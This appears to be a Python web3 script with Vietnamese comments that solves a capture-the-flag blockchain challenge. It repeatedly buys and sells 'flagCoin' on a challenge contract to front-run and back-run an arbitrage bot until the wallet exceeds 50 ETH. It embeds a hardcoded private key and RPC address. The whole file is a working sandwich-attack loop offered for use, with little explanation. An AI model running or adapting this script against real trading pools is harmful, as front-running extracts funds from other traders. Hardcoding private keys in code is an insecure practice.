import time
from web3 import Web3

rpc_url = "http://34.57.72.108:40193" 
private_key = "0xd9a755dc4e49cfa556d3fa309d70a12554f5bdc0f3eb93f28843b3aadc8465cc"
contract_address = "0xF0C349F21c9794C194DdcEBB6fDdc2AF224dDB32"

# --- Thiết lập kết nối và ví ---
w3 = Web3(Web3.HTTPProvider(rpc_url))
if not w3.is_connected():
    print("Không thể kết nối đến RPC!")
    exit()

account = w3.eth.account.from_key(private_key)
wallet_address = account.address
print(f"Địa chỉ ví: {wallet_address}")
print(f"Đã kết nối. Chain ID: {w3.eth.chain_id}")

# --- ABI và thiết lập contract ---
contract_abi = [{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"buy","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"check_balance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"eth","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"flag","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"flagCoin","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"flags","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isChallSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"k","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"flag","type":"uint256"}],"name":"priceForXFlagCoin","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"flag","type":"uint256"}],"name":"sell","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"to_pay","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalPrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"x","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"y","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]
contract = w3.eth.contract(address=contract_address, abi=contract_abi)

# --- Các biến cho vòng lặp tấn công ---
target_balance_wei = w3.to_wei(50, 'ether')
round_num = 1
nonce = w3.eth.get_transaction_count(wallet_address)
FIXED_GAS_PRICE = w3.to_wei(1.5, 'gwei') # Tăng nhẹ gas price để ưu tiên

while True:
    balance_wei = w3.eth.get_balance(wallet_address)
    print(f"\n--- VÒNG {round_num} ---")
    print(f"Số dư hiện tại: {w3.from_wei(balance_wei, 'ether')} ETH")

    if balance_wei > target_balance_wei:
        print("\n🎉 Đã đạt mục tiêu! Số dư ETH lớn hơn 50.")
        print("Bây giờ hãy quay lại netcat, chọn option 2 và nhập Secret để lấy flag.")
        break
    
    # --- BƯỚC 1: MUA (FRONT-RUN) ---
    amount_to_buy_wei = int(balance_wei * 0.95)
    print(f"Đang mua flagCoin với {w3.from_wei(amount_to_buy_wei, 'ether')} ETH...")

    try:
        tx_buy_params = {
            'from': wallet_address, 'value': amount_to_buy_wei, 'nonce': nonce,
            'gas': 500000, 'gasPrice': FIXED_GAS_PRICE, 'chainId': w3.eth.chain_id
        }
        tx_buy = contract.functions.buy().build_transaction(tx_buy_params)
        signed_tx_buy = account.sign_transaction(tx_buy)
        tx_hash_buy = w3.eth.send_raw_transaction(signed_tx_buy.raw_transaction)
        print(f"Đã gửi Tx Buy (nonce: {nonce}), hash: {tx_hash_buy.hex()}. Đang chờ xác nhận...")
        nonce += 1
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash_buy, timeout=180)
        
        if receipt.status == 0:
            print("Giao dịch Mua thất bại (reverted)!")
            continue
        print("Giao dịch Mua thành công!")
        
        # Lấy lượng ETH trong pool ngay sau khi ta mua
        eth_after_my_buy = contract.functions.eth().call()

    except Exception as e:
        print(f"Lỗi khi mua: {e}")
        nonce = w3.eth.get_transaction_count(wallet_address) # Đồng bộ lại nonce
        continue

    # --- BƯỚC 2: THEO DÕI BOT ---
    print("Đang chờ bot thực hiện arbitrage...")
    bot_traded = False
    # Chờ tối đa 20 giây để bot phản ứng
    for _ in range(20): 
        current_pool_eth = contract.functions.eth().call()
        # Nếu pool ETH hiện tại > pool ETH sau khi ta mua -> Bot đã trade!
        if current_pool_eth > eth_after_my_buy:
            print(f"Phát hiện bot đã giao dịch! Pool ETH đã tăng lên.")
            bot_traded = True
            break
        time.sleep(1) # Chờ 1 giây rồi kiểm tra lại

    if not bot_traded:
        print("Không phát hiện bot giao dịch. Bán để thu hồi vốn và sang vòng mới.")
    
    # --- BƯỚC 3: BÁN (BACK-RUN) ---
    flagcoin_balance = contract.functions.check_balance().call({'from': wallet_address})
    if flagcoin_balance > 0:
        print(f"Đang bán {w3.from_wei(flagcoin_balance, 'ether')} flagCoin...")
        try:
            tx_sell_params = {
                'from': wallet_address, 'nonce': nonce, 'gas': 500000,
                'gasPrice': FIXED_GAS_PRICE, 'chainId': w3.eth.chain_id
            }
            tx_sell = contract.functions.sell(flagcoin_balance).build_transaction(tx_sell_params)
            signed_tx_sell = account.sign_transaction(tx_sell)
            tx_hash_sell = w3.eth.send_raw_transaction(signed_tx_sell.raw_transaction)
            print(f"Đã gửi Tx Sell (nonce: {nonce}), hash: {tx_hash_sell.hex()}. Đang chờ xác nhận...")
            nonce += 1
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash_sell, timeout=180)

            if receipt.status == 0:
                print("Giao dịch Bán thất bại (reverted)!")
                continue
            print("Giao dịch Bán thành công!")

        except Exception as e:
            print(f"Lỗi khi bán: {e}")
            nonce = w3.eth.get_transaction_count(wallet_address) # Đồng bộ lại nonce
            continue
            
    round_num += 1